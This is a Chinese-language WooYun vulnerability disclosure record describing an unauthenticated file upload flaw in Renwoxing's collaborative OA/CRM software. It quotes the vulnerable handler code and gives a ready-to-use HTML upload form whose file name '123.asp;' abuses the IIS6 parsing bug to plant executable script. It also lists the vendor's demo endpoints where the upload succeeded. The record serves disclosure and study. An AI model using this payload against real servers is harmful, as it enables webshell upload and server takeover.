{"id": 49676, "wybug_id": "wooyun-2014-080481", "wybug_title": "某协同OA、协同CRM存在文件上传漏洞", "wybug_corp": "成都任我行信息技术有限公司", "wybug_author": "wefgod", "wybug_date": "2014-10-23 16:11", "wybug_open_date": "2015-04-02 11:02", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传", "代码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-28：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向公众公开  简要描述： 路过一下。需要结合IIS6解析漏洞使用，无需登录 详细说明：  官网：http://www.wecrm.com/成都任我行信息技术有限公司存在问题的系统是：任我行协同CRM、任我行协同OA、任我行协同CRM 精华版客户案例：http://www.wecrm.com/static/consumer/   漏洞证明：  漏洞文件：Handlers/OfficeFileDataWrite.ashx\nif (context.Request[\"fileName\"] != null)            {                text = context.Request[\"fileName\"].ToString();  //可控，文件名            }……………………                try                {                    HttpPostedFile httpPostedFile2 = context.Request.Files[\"EDITFILE\"];                    if (httpPostedFile2 != null)                    {                        int contentLength2 = httpPostedFile2.ContentLength;                        byte[] array2 = new byte[contentLength2];                        Stream inputStream2 = httpPostedFile2.InputStream;                        inputStream2.Read(array2, 0, contentLength2);                        if (new TypeTemplateExtendManager(currentUserInfo).SetWordStream((CrmBizObjectType)Convert.ToInt32(value2), id, array2, text, serPath, currTypeId))                        {                            DocxHtmlToPage docxHtmlToPage = new DocxHtmlToPage(text, null);                            docxHtmlToPage.SetServerDocxToHtmlPath();                            httpPostedFile2.SaveAs(this._htmlPath + text + \".docx\");  //text变量可控，可配合解析漏洞使用                            context.Response.Write(docxHtmlToPage.DocxConvertToHtml(true) ? \"1\" : \"-100\");                        }                        else                        {                            context.Response.Write(\"-1\");                        }                    }                    return;                }\n\n<html><form action=\"http://localhost:8888/Handlers/OfficeFileDataWrite.ashx?runType=2&objId=12&objType=1&filePathAndName=1&currTypeId=1\" name=\"test\" method=\"post\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"EDITFILE\" size=\"23\" /><input type=\"hidden\" name=\"fileName\" value=\"123.asp;\" /><input type=\"submit\" value=\"Submit\" /></form></html>\n上传成功后保存在UploadFolder\\Html目录下，因为文件名后会强制添加.docx，所以只能配合解析漏洞使用。以下是本地测试的截图（网上的破解版）：\n\n官方演示地址http://show.wecrm.com/oa/Handlers/OfficeFileDataWrite.ashxhttp://show.wecrm.com/xt/Handlers/OfficeFileDataWrite.ashxhttp://show.wecrm.com/jhb/Handlers/OfficeFileDataWrite.ashx同样可以上传成功http://show.wecrm.com/oa/UploadFolder/Html/123.asp;.docx\n\n但是因为官网所使用的是iis7，不存在解析漏洞，故无法利用。   修复方案：  随机化某个参数即可   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-04-02 11:02 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}